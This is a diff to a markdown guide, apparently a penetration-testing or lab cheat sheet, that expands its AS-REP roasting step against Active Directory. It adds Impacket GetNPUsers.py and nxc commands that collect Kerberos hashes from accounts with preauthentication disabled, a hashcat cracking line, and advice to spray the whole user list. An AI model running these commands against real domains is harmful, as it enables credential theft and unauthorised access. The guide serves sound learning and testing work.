@@ -27,17 +27,27 @@ enum4linux -a <DC-IP>
 
 ## Step 2 - AS-REP Roasting (No Creds Needed)
 
-Targets accounts with "Do not require Kerberos preauthentication." You only need a username list.
+Targets accounts with "Do not require Kerberos preauthentication" set. For those, the DC hands you a crackable hash with no password. You only need a username list.
+
+**Works on ANY account** with pre-auth disabled - not just service accounts. The flag can be on a regular user, admin, or service account. **So run it against the WHOLE list** - only vulnerable accounts return a hash; the rest just error out (it's self-selecting). Service accounts (`svc-*`) are a good first guess because they're often misconfigured, but never stop there.
 
 ```sh
-# From Linux (Impacket)
+# Spray the whole user list - only preauth-disabled accounts return a hash
 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat -no-pass
+
+# Single known user (e.g. an obvious svc- account)
+GetNPUsers.py corp.local/<user> -dc-ip <DC-IP> -no-pass
+
+# Or find them directly over LDAP (needs any valid creds)
+nxc ldap <DC-IP> -u <user> -p <pass> --asreproast asrep.txt
 
 # Crack the hash
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
 ```
 
 If cracked -> you now have valid domain credentials -> move to Step 4.
+
+> **Stuck with a user list but no creds?** You have exactly two options: **AS-REP roast** (this step) and **password spray** (Step 3). Try both.
 
 ---
 
